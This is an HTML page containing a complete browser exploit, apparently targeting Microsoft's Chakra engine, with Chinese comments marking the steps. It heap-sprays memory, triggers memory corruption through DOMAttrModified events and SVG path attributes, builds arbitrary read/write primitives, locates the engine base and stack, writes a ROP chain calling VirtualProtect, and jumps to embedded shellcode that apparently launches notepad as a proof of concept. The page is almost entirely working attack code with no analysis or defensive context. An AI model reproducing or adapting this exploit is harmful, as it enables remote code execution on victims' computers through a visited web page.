<!DOCTYPE html>
<head id='head_id_5' name='head_name_6'>
	<script>
		var flag_var=0;
		var spray_Array = new Array();
		var obj_Array = new Array(2500);
		var string_var = unescape("%ubeef%u10ad");
		var vul_base = 0x10f95344;
		var vul_index = null;
		var chakra_base = null;
		var shellcode = unescape("%u90cc%u9090%uc931%u57b9%u6e69%ueb45%u3104%uebc9%u3100%u31c0%u31db%u31d2%u31ff%u64f6%u7b8b%u8b30%u0c7f%u7f8b%u8b1c%u0847%u778b%u8b20%u803f%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%udd89%uf981%u6957%u456e%u3b75%u348b%u01af%u45c6%u0e39%uf675%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%ud989%uffb1%ue253%u68fd%u7865%u2065%u7068%u6461%u682e%u6f6e%u6574%ue289%u5141%uff52%ue8d7%uff86%uffff%u348b%u01af%u45c6%u3e81%u7845%u7469%uf275%u7e81%u5004%u6f72%u7563%u8be9%u247a%uc701%u8b66%u6f2c%u7a8b%u011c%u8bc7%uaf7c%u01fc%u31c7%u51c9%ud7ff");
	
	function start() {
		//Heap Spray
		array_size = 0x1000*500;
		for(var i=0; i<array_size; i++)
		{
			spray_Array[i] = [0x10adbeef,0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c];
		}
		//触发漏洞 更改某个Array的长度
		first_write();
		second_write();
		third_write();
		
		//触发jit
		for(i=0;i<10000;i++)
		{
			jit_fun();
		}
		
		//定位Vul Array对象
		for(var i=0; i<array_size; i++)
		{
			if (spray_Array[i].length != 4)
			{
				vul_index = i;
				break;
			}
		}
		
		var target_index = vul_index+1;
		chakra_base = get_base(spray_Array[vul_index][7]);
		
		spray_Array[target_index][2] = jit_fun;
		spray_Array[target_index][3] = shellcode;

		//通过JIT代码定位栈
		var fun_script = spray_Array[vul_index][0x16];
		var fun_body = read_dword(fun_script+4);
		var jit_code = read_dword(fun_body+0x10);
		var stack_addr = read_dword(jit_code+5);
		stack_addr = (stack_addr & 0xffff0000) + 0x1fb000;
		
		var tar_addr =  find_ret(stack_addr);
		
		//修改栈返回地址，跳转到shellcode
		if(tar_addr == 0xffffffff)
		{
			alert("false!!")
		}
		else
		{
			var virtualprotect = read_dword(chakra_base + 0x5EA168);
			var shellcode_var = spray_Array[vul_index][0x17];
			var pivot  = read_dword(shellcode_var+0x10);
			write_dword(tar_addr,chakra_base + 0x001a6550);
			write_dword(tar_addr+0xc,virtualprotect);
			write_dword(tar_addr+0x10,chakra_base + 0x00006be4);
			write_dword(tar_addr+0x14,pivot);
			write_dword(tar_addr+0x18,pivot);
			write_dword(tar_addr+0x1c,0x1000);
			write_dword(tar_addr+0x20,0x40);
			write_dword(tar_addr+0x24,0x10f95350);
			alert(tar_addr.toString(16));
		}
		
	}
	
	function first_write() {
		document.body["contentEditable"] = true;
	    flag_var = 0;
		string_var = unescape("%u4102%u4141%u8282%u8282%u4343%u4343%u4402%u4444%u4545%u4545%u4646%u4646%u5314%u10f9%u4848%u4848");
		window.document.addEventListener("DOMAttrModified",evil,true);
		document.body["contentEditable"] = false;
	}
	
	function second_write() {
	    document.body["contentEditable"] = true;
		flag_var = 0;
		string_var = unescape("%u4102%u4141%u8282%u8282%u4343%u4343%u4402%u4444%u4545%u4545%u4646%u4646%u532c%u10f9%u4848%u4848");
		window.document.addEventListener("DOMAttrModified",evil,true);
		document.body["contentEditable"] = false;
	}
	
	function third_write() {
		document.body["contentEditable"] = true;
	    flag_var = 0;
		string_var = unescape("%u4102%u4141%u8282%u8282%u4343%u4343%u4402%u4444%u4545%u4545%u4646%u4646%u5330%u10f9%u4848%u4848");
		window.document.addEventListener("DOMAttrModified",evil,true);
		document.body["contentEditable"] = false;
	}
	
	function evil(event) {
						flag_var++;
						if(flag_var>1)
						{
							window.document.removeEventListener("DOMAttrModified",evil,true);
						}

						try{document.getElementsByTagName("path")[0].setAttribute("transform",",,");} catch(err){}
						
						for (var i=0;i<1500;i++){
							obj_Array[i] = document.createElement('div');
							obj_Array[i].className = string_var.substr(0);
						}
						for (var i=0;i<1500;i++){
							obj_Array[i] = 0;
						}
						for (var i=0;i<1500;i++){
							obj_Array[i] = document.createElement('div');
							obj_Array[i].className = string_var.substr(0);
						}
	}
	
	function get_base(vtable)
	{
		var chakra_base = vtable&0xfffff000;
		while(read_dword(chakra_base) != 0x00905a4d)
			chakra_base = chakra_base - 0x1000;
			
		return chakra_base;
	}
	
	function read_dword(addr)
	{
		var offset = addr % 4; 
		var addr_index = 0;
		if(addr > vul_base)
		{
			addr_index = (addr - vul_base)/4;
		}
		else
		{
			addr_index = (0xffffffff-(vul_base-addr)+1)/4;
		}
		addr_index = Math.floor(addr_index);
		
		if (offset == 0)
			return (spray_Array[vul_index][addr_index])>>>0;
		
		var offset_hi = (1 << (offset*8));
		var offset_lo = (1 << ((4-offset)*8));
		
		var data_lo = Math.floor(((spray_Array[vul_index][addr_index])>>>0) / offset_hi)
		var data_hi = ((spray_Array[vul_index][addr_index+1])>>>0) % offset_hi;
		
		var data = (data_hi*offset_lo) | data_lo;
		return data;
		
 	}
	
	function write_dword(addr,value)
	{
		if(addr%4 != 0)
		{
			alert("wrong!!!!!");
			return 0;
		}
		var addr_index = 0;
		if(addr > vul_base)
		{
			addr_index = (addr - vul_base)/4;
		}
		else
		{
			addr_index = (0xffffffff-(vul_base-addr)+1)/4;
		}
		spray_Array[vul_index][addr_index] = value;
	}
	
	function find_ret(stack_addr)
	{
		var ret_addr  = 0xffffffff; 
		var call_function_ret = chakra_base + 0x00208364;
		var def_parse_ret = chakra_base + 0x002ab3f0;
		for (var i=stack_addr; i< stack_addr+0x2000; i=i+4)
		{
			if(read_dword(i) == call_function_ret)
			{			
				if(read_dword(i-4) == (i-4+0x28))
				{
					if(read_dword(i-0x10) == def_parse_ret)
					{
						ret_addr = i; 
					}
				}
			}
		}
		return ret_addr;
	}
	
	function jit_fun(){ var a=0;a=a+1;a=a+2; return a;}
	</script>
</head>
<body>
	<button onclick="start();"></button>
	<svg>
		<path></path>
	</svg>

</body>